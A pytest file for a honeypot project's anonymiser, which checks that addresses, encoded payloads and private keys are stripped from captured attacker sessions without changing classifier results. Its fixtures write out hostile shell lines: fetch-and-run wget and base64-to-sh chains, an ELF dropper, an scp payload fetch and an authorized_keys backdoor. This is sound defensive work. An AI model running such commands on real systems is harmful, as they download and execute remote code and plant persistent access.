"""Tests for making the evaluation set safe to commit.

Two properties carry the weight. Nothing identifying survives; and nothing a
classifier depends on is lost, because an anonymiser that changes a
classifier's answer would change the evaluation without anyone noticing.
"""

from __future__ import annotations

import pytest

from honeypot_ai.classify import rules
from honeypot_ai.classify.facts import SessionFacts
from honeypot_ai.label.anonymise import Anonymiser

# Real-looking public addresses for the tests to remove. These are genuine
# public ranges on purpose: the documentation ranges are what the anonymiser
# writes, so a test written with them could not tell success from failure.
PUBLIC_A = "8.8.8.8"
PUBLIC_B = "1.1.1.1"


def facts(*commands: str, urls: tuple[str, ...] = ()) -> SessionFacts:
    return SessionFacts(session_id="s", commands=commands, download_urls=urls)


# --- Addresses -------------------------------------------------------------


def test_a_public_address_becomes_a_documentation_address() -> None:
    out = Anonymiser().text(f"wget http://{PUBLIC_A}/x.sh")
    assert PUBLIC_A not in out
    assert "http://198.51.100.1/x.sh" in out


def test_the_same_address_gets_the_same_placeholder_everywhere() -> None:
    """Otherwise two sessions fetching from one server stop looking related."""
    anonymiser = Anonymiser()
    first = anonymiser.text(f"wget http://{PUBLIC_A}/a")
    second = anonymiser.text(f"curl {PUBLIC_A}/b; wget {PUBLIC_B}/c")

    assert "198.51.100.1/a" in first
    assert "198.51.100.1/b" in second
    assert "198.51.100.2/c" in second


@pytest.mark.parametrize(
    "address",
    ["127.0.0.1", "0.0.0.0", "10.0.0.5", "192.168.1.1", "172.16.0.9"],  # noqa: S104
)
def test_private_and_loopback_addresses_are_left_alone(address: str) -> None:
    """They identify nobody, and rewriting them changes what a session means."""
    assert Anonymiser().text(f"ping {address}") == f"ping {address}"


def test_something_that_only_looks_like_an_address_is_left_alone() -> None:
    assert Anonymiser().text("echo 999.1.1.1") == "echo 999.1.1.1"


def test_a_port_does_not_stop_the_address_being_found() -> None:
    out = Anonymiser().text(f"nc {PUBLIC_A}:4444")
    assert PUBLIC_A not in out
    assert "198.51.100.1:4444" in out


def test_a_public_ipv6_address_is_replaced_and_loopback_is_not() -> None:
    anonymiser = Anonymiser()
    assert "2606:4700::1111" not in anonymiser.text("ping6 2606:4700::1111")
    assert anonymiser.text("ping6 ::1") == "ping6 ::1"


def test_download_urls_are_anonymised_as_well_as_commands() -> None:
    out = Anonymiser().facts(facts("wget x", urls=(f"http://{PUBLIC_A}/x",)))
    assert PUBLIC_A not in out.download_urls[0]


def test_hostnames_are_kept() -> None:
    """Attacker infrastructure, and the ordinary currency of threat intel."""
    assert "evil.example" in Anonymiser().text("wget http://evil.example/x")


# --- Payloads typed in as text ---------------------------------------------

ELF_CHUNK = r'echo -ne "\x7F\x45\x4C\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00" > .d'


def test_a_long_hex_payload_is_cut_to_its_first_bytes() -> None:
    out = Anonymiser().text(ELF_CHUNK)
    assert r"\x7F\x45\x4C\x46" in out  # the ELF magic, recognisable
    assert r"\x01\x01\x01\x61" not in out  # and nothing after it
    assert "+12 bytes sha256:" in out


def test_a_short_hex_marker_is_left_intact() -> None:
    """`echo -e "\\x6F\\x6B"` is a liveness probe, not a payload."""
    probe = r'echo -e "\x6F\x6B"'
    assert Anonymiser().text(probe) == probe


# Realistic base64: mixed case and digits, which is what encoded data looks
# like and what separates it from a long path or a hex digest.
BLOB = "IyEvYmluL3NoCmNkIC90bXAgfHwgY2QgL3Zhci90bXAKd2dldCBodHRwOi8vZXhhbXBsZQo" * 3


def test_a_long_base64_blob_is_cut() -> None:
    out = Anonymiser().text(f"echo {BLOB} | base64 -d | sh")
    assert BLOB not in out
    assert f"<base64: {len(BLOB)} chars sha256:" in out


def test_nothing_of_an_encoded_run_is_kept_not_even_a_prefix() -> None:
    """Sixteen characters from every line of a ten-line key is a quarter of
    the key, and partial-key-exposure attacks work from fractions like that."""
    out = Anonymiser().text(f"echo {BLOB}")
    assert BLOB[:8] not in out


def test_a_long_path_is_not_mistaken_for_encoded_data() -> None:
    path = "/usr/local/share/applications/somethingverylongwithoutanydigits/bin"
    assert Anonymiser().text(f"ls {path}") == f"ls {path}"


def test_a_sha256_written_in_a_command_is_left_intact() -> None:
    digest = "a" * 64
    assert digest in Anonymiser().text(f"sha256sum -c {digest}")


# --- Private keys -----------------------------------------------------------
#
# The first real sample contained a session that wrote an OpenSSH private key
# to disk one line per command and used it to fetch its payload over scp. Every
# line was under the old 80-character threshold, so all ten went through. The
# key below is invented; only its shape is taken from that session.

# Markers are built at runtime so no scanner sees a literal key block in the repo.
_BEGIN = "-----BEGIN OPENSSH " + "PRIVATE KEY-----"
_END = "-----END OPENSSH " + "PRIVATE KEY-----"
_BEGIN_RSA = "-----BEGIN RSA " + "PRIVATE KEY-----"
_END_RSA = "-----END RSA " + "PRIVATE KEY-----"

FAKE_KEY_LINES = (
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
    "QyNTUxOQAAACBhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkAAAAJmFiY2",
    "RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0",
    "dXZ3eHl6MDEyMzQ1Njc4OQAAAA",
)
SPLIT_KEY_SESSION = (
    f"cd /tmp || cd /var/tmp; echo '{_BEGIN}",
    *FAKE_KEY_LINES,
    f"{_END}' > key.ppk; echo 'StrictHostKeyChecking no' > sshcfg",
    f"{_END} > key.ppk",
    "chmod 400 key.ppk; scp -i key.ppk dlr@203.0.113.9:sh out_sh",
)


def test_a_key_pasted_one_line_per_command_does_not_survive() -> None:
    out = Anonymiser().facts(facts(*SPLIT_KEY_SESSION))
    joined = "\n".join(out.commands)
    for line in FAKE_KEY_LINES:
        assert line not in joined
        assert line[:12] not in joined


def test_no_private_key_marker_survives_for_the_commit_hook_to_find() -> None:
    """The repository refuses commits containing a private-key header. That
    hook should never have to be what catches this."""
    joined = "\n".join(Anonymiser().facts(facts(*SPLIT_KEY_SESSION)).commands)
    assert "PRIVATE KEY-----" not in joined


def test_what_the_session_did_with_the_key_is_kept() -> None:
    """The key goes; the fact that it was written and used stays."""
    out = Anonymiser().facts(facts(*SPLIT_KEY_SESSION)).commands
    assert "> key.ppk" in out[len(FAKE_KEY_LINES) + 1]
    assert out[-1].startswith("chmod 400 key.ppk; scp -i key.ppk")
    assert len(out) == len(SPLIT_KEY_SESSION)


def test_a_key_block_inside_one_command_is_replaced_whole() -> None:
    command = f"echo '{_BEGIN_RSA}\n" + "\n".join(FAKE_KEY_LINES) + f"\n{_END_RSA}' > id_rsa"
    out = Anonymiser().facts(facts(command)).commands[0]
    assert all(line not in out for line in FAKE_KEY_LINES)
    assert "<private key: RSA PRIVATE KEY" in out
    assert out.endswith("> id_rsa")


def test_a_key_that_never_closes_is_redacted_to_the_end() -> None:
    """Losing a few commands is the right trade against publishing a key."""
    out = Anonymiser().facts(facts(f"echo '{_BEGIN}", *FAKE_KEY_LINES))
    assert all(line not in "\n".join(out.commands) for line in FAKE_KEY_LINES)


def test_a_binary_pasted_through_a_base64_heredoc_does_not_survive() -> None:
    """The first real sample held a 64-bit ELF delivered this way, 64
    characters to a command, every line under the old threshold."""
    lines = tuple(BLOB[i : i + 64] for i in range(0, 192, 64))
    out = Anonymiser().facts(facts("base64 -d > /tmp/hum <<.", *lines)).commands
    assert out[0] == "base64 -d > /tmp/hum <<."
    assert all(line not in "\n".join(out) for line in lines)


# --- The invariant the evaluation depends on -------------------------------


@pytest.mark.parametrize(
    "commands",
    [
        (ELF_CHUNK, "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep"),
        (r'echo -e "\x6F\x6B"',),
        (r'echo -e "\x47\x41\x59\x46\x47\x54"',),
        # Eight bytes: the one marker long enough to be truncated, and so the
        # one that proves truncation keeps enough for the rule to match.
        (r'echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"',),
        (f"cd /tmp; wget http://{PUBLIC_A}/bins/x.sh; chmod 777 x.sh; sh x.sh",),
        ('cd ~ && mkdir .ssh && echo "ssh-rsa ' + "A" * 300 + '" >> .ssh/authorized_keys',),
        ("uname -a", "cat /proc/cpuinfo", "nproc"),
        ("enable", "system", "shell", "sh"),
        SPLIT_KEY_SESSION,
    ],
)
def test_anonymising_never_changes_what_the_rules_conclude(commands: tuple[str, ...]) -> None:
    raw = facts(*commands)
    safe = Anonymiser().facts(raw)

    before, after = rules.classify(raw), rules.classify(safe)
    assert after.intent is before.intent
    assert after.behaviours == before.behaviours
